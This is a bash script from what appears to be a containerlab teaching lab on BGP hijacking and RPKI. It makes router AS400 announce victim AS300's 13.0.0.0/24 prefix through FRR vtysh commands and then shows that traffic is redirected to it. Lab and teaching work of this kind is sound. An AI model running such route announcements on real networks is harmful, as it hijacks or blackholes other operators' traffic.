#!/bin/bash
# =============================================================
# start_exact_hijack.sh — Attack Type 1: Exact Prefix Hijack
#
# AS400 (R4) announces 13.0.0.0/24 — same prefix as victim AS300.
# R1 will prefer R4's route because AS path length is shorter:
#   Attacker path: AS400           (length 1)
#   Legitimate path: AS200 AS300   (length 2)
# =============================================================

LAB="bgp-hijack-rpki"
R4="clab-${LAB}-r4"
R1="clab-${LAB}-r1"

BOLD="\033[1m"
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
RESET="\033[0m"

echo -e "${BOLD}================================================${RESET}"
echo -e "${RED}[ATTACK] Launching Exact Prefix Hijack${RESET}"
echo -e "${BOLD}================================================${RESET}"
echo -e "AS400 will announce ${RED}13.0.0.0/24${RESET} (same as victim AS300)"
echo ""

# Inject the hijacked route into R4's BGP
echo "[1/2] Injecting 13.0.0.0/24 into AS400 BGP table..."
docker exec "$R4" vtysh \
  -c "configure terminal" \
  -c "router bgp 400" \
  -c "network 13.0.0.0/24" \
  -c "end" \
  -c "write memory"

# Add a null route in R4's kernel so FRR accepts the network statement
docker exec "$R4" ip route add 13.0.0.0/24 via 127.0.0.1 dev lo 2>/dev/null || true

echo "[2/2] Waiting 10 seconds for BGP convergence..."
sleep 10

echo ""
echo -e "${YELLOW}--- R1 BGP Table After Attack ---${RESET}"
docker exec "$R1" vtysh -c "show bgp ipv4 unicast 13.0.0.0/24"

echo ""
echo -e "${YELLOW}--- R1 Routing Table (next hop for 13.0.0.0) ---${RESET}"
docker exec "$R1" vtysh -c "show ip route 13.0.0.0/24"

echo ""
echo -e "${RED}Expected: R1 now routes to R4 (AS400) instead of R3 (AS300)${RESET}"
echo -e "${GREEN}Run scripts/stop_attack.sh to withdraw the hijack${RESET}"
echo -e "${BOLD}================================================${RESET}"
